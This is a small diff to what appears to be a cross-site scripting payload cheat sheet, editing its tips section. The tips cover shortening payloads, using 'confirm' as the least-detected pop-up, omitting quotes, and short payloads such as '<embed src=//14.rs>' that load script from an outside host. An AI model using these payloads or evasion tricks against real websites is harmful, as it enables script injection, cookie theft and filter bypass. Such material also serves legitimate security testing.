@@ -66,9 +66,9 @@ Come back later
 ### Awesome Tips & Tricks
 - http:// can be shortened to //
 - **document.cookie** can be shortened to **cookie**. It applies to other DOM objects as well.
-- alert and other function don't need a value, so stop doing **alert(1)** and start doing **alert()**
-- I have found that **confirm** is the least detected pop-up function so stop using alert.
-- Quotes around attribute value aren't neccessary. You can use **&lt;script src=//14.rs&gt;** instead of **&lt;script src="//14.rs"glt;**
+- alert and other pop-up functions don't need a value, so stop doing **alert(1)** and start doing **alert()**
+- I have found that **confirm** is the least detected pop-up function so stop using **alert**.
+- Quotes around attribute value aren't neccessary. You can use **&lt;script src=//14.rs&gt;** instead of **&lt;script src="//14.rs"&glt;**
 - The shortest independent payload is **&lt;embed src=//14.rs&gt;** (19 chars)
 
 ## Credits and all that
